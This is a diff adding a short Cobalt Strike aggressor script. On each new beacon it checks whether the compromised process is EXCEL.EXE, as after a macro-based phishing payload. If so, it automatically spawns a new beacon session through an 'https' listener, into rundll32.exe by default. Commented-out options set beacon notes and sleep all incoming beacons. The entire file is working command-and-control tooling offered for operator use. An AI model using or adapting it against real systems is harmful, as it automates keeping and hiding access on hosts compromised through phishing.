@@ -1,0 +1,43 @@
+#===================================#
+#									#
+#	initial beacon spawn script		#
+#	author: karen miller			#
+#	date: may 18, 2022				#
+#									#
+#===================================#
+
+#===================================================================#
+#																	#
+#	usage: load this script into cobalt strike						#
+#	spawns beacon if new session process is in plist				#
+#																	#
+#===================================================================#
+
+#===================================================================#
+#																	#
+#	notes: add/remove process names in @plist based on use case		#
+#	replace 'https' with the name of listener used for spawning		#
+#	default spawn session process is rundll32.exe					#
+#	spawn session process can be modified in profile (spawnto)		#
+#																	#
+#===================================================================#
+
+
+on beacon_initial {
+
+	# uncomment the line below to automatically set beacon note to connection time
+	# bnote($1,"ESTABLISHED: " . formatDate('MM/dd/yyyy HH:mm'));
+
+	# get process name for new session
+	$pname = beacon_data($1) ["process"];
+	@plist = @("EXCEL.EXE");
+
+	# if session process matches any process names in plist, spawn a new session
+	if (iff($pname in @plist,true,false)) {
+		bspawn($1, "https");
+	}
+
+	# uncomment the line below to automatically sleep ALL incoming beacons (e.g., overnight)
+	# bsleep($1, 60 * 60, 20);
+
+}
